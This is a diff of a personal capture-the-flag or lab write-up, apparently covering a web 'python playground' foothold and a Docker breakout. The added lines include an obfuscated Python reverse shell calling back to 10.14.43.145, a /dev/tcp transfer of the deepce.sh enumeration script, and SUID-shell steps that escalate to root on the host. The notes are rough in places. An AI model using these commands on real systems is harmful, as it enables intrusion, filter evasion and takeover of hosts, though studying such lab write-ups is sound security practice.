@@ -24,7 +24,7 @@ Nmap found:
 
 ![](supersecretpanel.png)
 
-![](athreattosecurity.png)
+
 
 ```js
 function string_to_int_array(str) {
@@ -100,6 +100,12 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+``
+
+## Exploit
+
+Super secret python playground.
+![](athreattosecurity.png)
 
 
 We will probably need to evade filting of a reverse shell
@@ -117,6 +123,7 @@ Learning that simple obfuscation - Al pointed the way
 ```python
 # Reverse the strings and return back to intended form with [::-1]
 # base64 encoding
+"so tropmi"[::-1]
 
 socket = __import__("socket", globals=None, locals=None, fromlist=(), level=0)
 os = __import__("os", globals=None, locals=None, fromlist=(), level=0)
@@ -126,12 +133,43 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.43.145",444
 
 ![](rootinthedockercontainer.png)
 
-## Exploit
 
 
-## Foothold
 
-## PrivEsc
+## Docker Bre..ssh Connor Site remember... but PrivEsc
+
+Docker enumeration
+```bash
+mount # Key 
+```
+
+![](dockerprocs.png)
+
+Transfer Deepce.sh
+```bash
+# Use nc to serve the file
+nc -lvnp 80 < deepce.sh
+# Target machine
+bash -c "cat < /dev/tcp/10.14.43.145/80 > /tmp/deepce.sh"
+```
+
+Annoyingly we could just ssh in a connor as we know it connors site...
+![](roothasscripts.png)
+
+![](weirdport.png)
+
+![](weirdport.png)
+
+```bash
+mount # check if it is mounted into the host filesystem 
+# If so and you are root in dockerenv
+cp /bin/sh $mount_misconfiguration_dir
+# Give the binary suid privileges
+chmod u+s /bin/sh  
+# And PrivEsc on the host after breakout.
+```
+  
+![](privescthrutoroot.png)
 
 ## Beyond Root
 
